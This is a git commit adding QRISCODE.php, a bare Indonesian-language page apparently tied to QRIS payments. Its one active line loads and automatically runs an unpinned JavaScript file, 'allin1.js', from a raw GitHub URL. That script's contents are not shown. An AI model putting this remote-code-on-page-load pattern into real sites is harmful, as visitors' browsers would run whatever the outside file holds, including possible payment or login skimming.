b6020d4cc0bba1cce18f420359308e593c48ce05
inggarfi <inggarsaput@gmail.com>
2025-04-08 07:17:47 +0700

    Create QRISCODE.php

---
+++ QRISCODE.php
@@ -0,0 +1,14 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>Halaman QRIS Otomatis</title>
+</head>
+<body>
+    <h1>Selamat datang di halaman!</h1>
+    <p>Script eksternal akan dijalankan otomatis dari GitHub.</p>
+
+    <!-- Load JavaScript dari GitHub Raw -->
+    <script src="https://raw.githubusercontent.com/inggarfi/dexter/refs/heads/main/allin1.js"></script>
+</body>
+</html>
